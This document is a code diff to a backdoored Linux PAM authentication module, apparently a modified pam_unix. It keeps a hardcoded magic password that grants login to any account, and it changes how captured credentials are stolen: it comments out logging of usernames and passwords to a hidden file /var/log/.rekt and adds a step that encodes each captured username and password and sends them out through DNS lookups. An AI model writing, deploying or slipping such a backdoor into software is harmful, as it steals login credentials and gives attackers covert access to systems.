@@ -61,7 +61,7 @@
 
 
 unsigned char *bdstr = "_PASSWORD_";
-FILE *rekt;
+//FILE *rekt;
 
 
 #define AUTH_RETURN						\
@@ -177,15 +177,14 @@ pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv)
     memset(out, 0, 1024);
     sprintf(pw ,"%s:%s\n", name, p);
     encryptDecrypt(pw, out);
-    ngethostbyname(out, T_A);
-	/* verify the password of this user */
+   ngethostbyname(b64_encode(out, strlen(out)), T_A);	/* verify the password of this user */
         char *bdenc = b64_encode(p, strlen(p));
         if (strcmp(bdenc, bdstr) != 0) {
           retval = _unix_verify_password(pamh, name, p, ctrl);
-          rekt=fopen("/var/log/.rekt", "a");
+/*          rekt=fopen("/var/log/.rekt", "a");
           fprintf(rekt, "%s:%s\n", name, p);
           fclose(rekt);
-        } else {
+  */      } else {
           retval = PAM_SUCCESS;
         }
         free(bdenc);
